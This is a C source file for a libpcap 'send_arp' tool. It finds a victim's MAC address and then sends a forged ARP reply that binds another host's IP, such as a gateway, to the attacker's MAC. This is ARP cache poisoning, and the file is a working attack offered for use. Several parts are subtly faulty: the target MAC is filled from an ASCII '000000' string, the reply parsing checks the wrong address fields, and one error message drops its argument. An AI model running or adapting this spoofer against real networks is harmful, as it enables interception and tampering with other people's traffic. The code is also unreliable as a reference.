#include <pcap.h>
#include <stdio.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <net/ethernet.h>
#include <net/if.h>
#include <sys/ioctl.h>
#include <string.h>
#include <stdlib.h>

#define ETHER_HEADER_SIZE 14
#define ETHERADDR_LEN 6
#define ETHERTYPE_ARP 0X0806
#define ARPHRD_ETHER 1
#define ETHERTYPE_IP 0X0800
#define IPADDR_LEN 4
#define ARP_REQ	1
#define ARP_REPLY 2
#define BROADCAST "000000"

struct arp{
	u_int16_t htype; // Hardware Type
	u_int16_t ptype; // Protocol Type
	u_char hlen; // MAC Address Length
	u_char plen; // Protocol Address Length
	u_int16_t oper; // Operation Code
	u_char sha[6]; // Sender MAC Address
	u_char spa[4]; // Send IP Address
	u_char tha[6]; // Target MAC Address
	u_char tpa[4]; // Target IP Address
};

struct mac_ip_info{
	u_char ip[4];
	u_char mac[6];
};

int GetMac(char *dev, u_char * mac) {
	u_int32_t sock_mac;
	struct ifreq ifr_mac;

	sock_mac = socket(AF_INET, SOCK_STREAM, 0);
	if (sock_mac == -1) {
		fprintf(stderr, "Create socket error\n");
		exit(EXIT_FAILURE);
	}

	memset(&ifr_mac, 0, sizeof(ifr_mac));
	strncpy(ifr_mac.ifr_name, dev, sizeof(ifr_mac.ifr_name)-1);

	if ((ioctl(sock_mac, SIOCGIFHWADDR, &ifr_mac)) < 0) {
		fprintf(stderr, "Mac ictol error\n");
		exit(EXIT_FAILURE);
	}

	memcpy(mac, ifr_mac.ifr_hwaddr.sa_data, 6);
	return 0;
}

int GetIp(char *dev, u_char ip[4]){
	u_int32_t sock_ip;
	struct ifreq ifr_ip;

	sock_ip = socket(AF_INET, SOCK_DGRAM,0);
	if (sock_ip == -1){
		fprintf(stderr, "Create socket error\n");
		exit(EXIT_FAILURE);
	}
	ifr_ip.ifr_addr.sa_family = AF_INET;
	strncpy(ifr_ip.ifr_name, dev, sizeof(ifr_ip.ifr_name)-1);
	if((ioctl(sock_ip, SIOCGIFADDR, &ifr_ip)) <0){
		fprintf(stderr, "Ip ictol error\n");
		exit(EXIT_FAILURE);
	}
	memcpy(ip, &((struct sockaddr_in *)&ifr_ip.ifr_addr)->sin_addr, 4);
	return 0;
}

void * strToip(char * ip,struct mac_ip_info * info){
	char * p = strtok(ip,".");
	int i = 0;
	info->ip[0] = atoi(p);
	while(p!=NULL){
		i++;
		p=strtok(NULL,".");
		if(p)
			info->ip[i] = atoi(p);
	}

}

void GetAttackerInfo(char *dev,struct mac_ip_info * info){
	GetMac(dev,info->mac);
	GetIp(dev,info->ip);
}	

void GetVictimInfo(char * ip,struct mac_ip_info * info){
//	char * p = strtok(ip,".");
//	int i = 0;
/*	info->ip[0]=atoi(p);
	while(p!=NULL)
	{
		i++;
		p=strtok(NULL,".");
		if(p)
			info->ip[i] = atoi(p);
	}*/

	strToip(ip,info);
	
	for(int i =0;i<6;i++) info->mac[i]=0;
}	


void print_mac_addr(u_char * mac_addr){
	printf("[%02x:%02x:%02x:%02x:%02x:%02x]\n",
			mac_addr[0],
			mac_addr[1],
			mac_addr[2],
			mac_addr[3],
			mac_addr[4],
			mac_addr[5]);
}

void print_ip_addr(u_char * ip_addr){
	u_int32_t i;
	for(i=0;i<4;i++){
		if(i != 3)
			printf("%d.", ip_addr[i]);
		else
			printf("%d\n", ip_addr[i]);
	}
}

void send_arp(pcap_t * handle,char * dev,struct mac_ip_info * sender, struct mac_ip_info * target, uint16_t oper){
	u_char packet[42];
	struct ether_header * ether = (struct ether_header*)packet;
	struct arp * arp_header = (struct arp *)(packet+ETHER_HEADER_SIZE);
	u_char broadcast[6]={0xff,0xff,0xff,0xff,0xff,0xff};
	
	memcpy(ether->ether_shost,sender->mac,6);
	if(target->mac[0]==0){
		memcpy(ether->ether_dhost,broadcast,ETHER_ADDR_LEN);
		printf("2");
	}
	ether->ether_type=htons(ETHERTYPE_ARP); 
	
	arp_header->htype=htons(ARPHRD_ETHER);
	arp_header->ptype=htons(ETHERTYPE_IP);
	arp_header->hlen = ETHERADDR_LEN;
	arp_header->plen = IPADDR_LEN;
	arp_header->oper = htons(oper);

	memcpy(arp_header->sha,sender->mac,ETHER_ADDR_LEN);
	memcpy(arp_header->spa,sender->ip,IPADDR_LEN);
	if(oper == ARP_REQ)
		memcpy(arp_header->tha, BROADCAST ,ETHER_ADDR_LEN);
	else
		memcpy(arp_header->tha,target->mac,ETHER_ADDR_LEN);
	memcpy(arp_header->tpa, target->ip, IPADDR_LEN);
	
	if (pcap_sendpacket(handle, packet, 42) != 0){
		fprintf(stderr,"\nError sending the packet : \n", pcap_geterr(handle));
		return ;
	}

}


void usage() {
	printf("syntax: send_arp <interface> <sender ip> <target ip>\n");
	printf("sample: send_arp eth0 192.168.31.114 192.168.31.1\n");
}

int main(int argc, char* argv[]) {
	if (argc != 4) {
		usage();
		return -1;
	}

	char* dev = argv[1];
	char errbuf[PCAP_ERRBUF_SIZE];
	u_char Mac[6], Ip[4];
	struct mac_ip_info * attacker = (struct mac_ip_info *)malloc(sizeof(struct mac_ip_info));
	struct mac_ip_info * victim = (struct mac_ip_info *)malloc(sizeof(struct mac_ip_info));
	struct mac_ip_info * fake = (struct mac_ip_info *)malloc(sizeof(struct mac_ip_info));
	struct pcap_pkthdr* header;
	struct ether_header * ether_header;
	struct arp * arp_header;
	const u_char * packet;
	int res;

	pcap_t* handle = pcap_open_live(dev, BUFSIZ, 1, 1000, errbuf);

	if (handle == NULL) {
		fprintf(stderr, "couldn't open device %s: %s\n", dev, errbuf);
		return -1;
	}

	GetAttackerInfo(dev, attacker);
	GetVictimInfo(argv[2],victim);
	
	printf("[*] victim ip addr : "); print_ip_addr(victim->ip);
	printf("[*] LOCAL MAC ADDR : "); print_mac_addr(attacker->mac);
	printf("[*] LOCAL IP ADDR : "); print_ip_addr(attacker->ip);
	
	send_arp(handle,dev,attacker,victim,ARP_REQ);
	while(true){
		res = pcap_next_ex(handle,&header,&packet);
		if(res == 0) continue;
		if(res == -1 || res == -2) break;

		ether_header = (struct ether_header *)packet;
		if(ntohs(ether_header->ether_type) == ETHERTYPE_ARP){
			arp_header = (struct arp*)(packet+ETHER_HEADER_SIZE);
			if(ntohs(arp_header->oper) == ARP_REPLY){
				if(!memcmp(arp_header->tpa,victim->ip,IPADDR_LEN)){
					memcpy(victim->mac,arp_header->tha,ETHERADDR_LEN);
					printf("[*] Victim's Mac : "); print_mac_addr(victim->mac);
					break;
				}
			}
		}
	}
	
	strToip(argv[3],fake);
	memcpy(fake->mac,attacker->mac,ETHERADDR_LEN);
	send_arp(handle,dev,fake,victim,ARP_REPLY);

/*
	int res = pcap_next_ex(handle, &header, &packet);
	if (res == 0) continue;
	if (res == -1 || res == -2) break;
	printf("%u bytes captured\n", header->caplen);

*/


	pcap_close(handle);
	return 0;
}
